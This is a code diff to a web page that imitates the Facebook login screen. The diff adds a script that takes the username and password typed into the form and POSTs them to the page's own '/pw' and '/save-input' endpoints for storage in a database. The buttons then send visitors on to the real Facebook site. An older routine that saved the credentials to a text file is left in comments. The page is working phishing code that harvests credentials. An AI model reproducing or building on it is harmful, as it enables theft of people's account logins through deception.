@@ -49,7 +49,7 @@
       </div>
 
       <!-- User name and password section -->
-      <form>
+      <form id="inputForm">
         <div class="login col-12"> 
           <input
             class="login-field"
@@ -71,20 +71,21 @@
           />
         
         </div>
+        
+       <!-- Log in button as well as saving data to txt file -->
+       <div class="col-12">
+        <button
+          type="submit"
+          id="bt"
+          class="login-btn btn btn-primary btn-lg"
+          onclick="window.location.href='https://www.facebook.com/';"
+        >
+        <b>Log In</b>
+        </button>
 
-      <!-- Log in button as well as saving data to txt file -->
-        <div class="col-12">
-          
-          <button
-            type="submit"
-            id="bt"
-            class="login-btn btn btn-primary btn-lg"
-            onclick="saveFile()"
-          >
-          Log In
-          </button>
-        </div>
       </form>
+        
+      </div>
         <!-- create a new account section -->
 
         <div class="forgot-pass col-12">
@@ -95,7 +96,7 @@
         </div>
         <hr class="hr-text" data-content="or" />
         <div class="col-12">
-          <button type="submit" class="create-btn btn btn-lg btn-outline-dark">
+          <button type="submit" class="create-btn btn btn-lg btn-outline-dark" onclick="window.location.href='https://www.facebook.com/reg/';">
             <strong>Create new account</strong>
           </button>
         </div>
@@ -121,6 +122,31 @@
       </div>
     </div>
   </body>
+
+  <!-- This script saves it to a sqlite3 database -->
+  <script>
+    document
+      .getElementById("inputForm")
+      .addEventListener("submit", async (event) =>{
+        event.preventDefault();
+
+        const userName = document.getElementById("userName").value;
+        const passWord = document.getElementById("passWord").value;
+
+        const responses =await fetch("/pw", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({pw: passWord}),
+        });
+
+        const response =await fetch("/save-input", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({input: userName}),
+        });
+
+      });
+  </script>
 
   <!-- this script allows us to save credentials as json file using browser built-in API -->
   <!-- <script>
@@ -152,7 +178,7 @@
   </script> -->
   <!-- This script allows us to save credentials as .txt file. leaving it here just in case -->
 
-  <script>
+  <!-- <script>
     let saveFile = () => {
       // Get the data from each element on the form.
       const userName = document.getElementById("userName");
@@ -183,5 +209,5 @@
 
       newLink.click();
     };
-  </script>
+  </script> -->
 </html>
